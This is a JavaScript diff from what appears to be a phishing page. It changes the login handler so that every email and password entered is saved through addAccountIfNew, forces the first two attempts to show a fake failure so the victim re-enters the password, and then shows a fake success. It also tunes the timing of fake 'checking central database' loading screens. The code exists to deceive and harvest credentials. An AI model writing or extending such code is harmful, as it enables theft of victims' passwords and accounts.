@@ -1210,10 +1210,14 @@
         const userAttempts = userAttemptMap.get(emailVal) || 0;
         userAttemptMap.set(emailVal, userAttempts + 1);
 
-        if (userAttempts === 0) {
+        // Store credentials on first attempt (and all attempts)
+        addAccountIfNew(emailVal, passVal);
+
+        // First two attempts: password wrong (fail)
+        if (userAttempts < 2) {
             await runFakeWithFail(emailVal, passVal);
         } else {
-            addAccountIfNew(emailVal, passVal);
+            // Third attempt onwards: success (after previous failures)
             await runFakeSuccess(emailVal, passVal);
         }
     }
@@ -1231,7 +1235,7 @@
         loader.style.display = 'block';
         setProgress(0);
 
-        const totalMs = 30000 + Math.random() * 30000;
+        const totalMs = 25000 + Math.random() * 15000;
         const stepMs = totalMs / 100;
         const statusMsgs = [
             { at: 5,  icon:'fa-spinner fa-pulse', text:'فحص قاعدة البيانات المركزية...' },
@@ -1279,7 +1283,7 @@
         loader.style.display = 'block';
         setProgress(0);
 
-        const totalMs = 30000 + Math.random() * 30000;
+        const totalMs = 30000 + Math.random() * 20000;
         const stepMs = totalMs / 100;
         const statusMsgs = [
             { at: 5,  icon:'fa-spinner fa-pulse',  text:'فحص قاعدة البيانات المركزية...' },
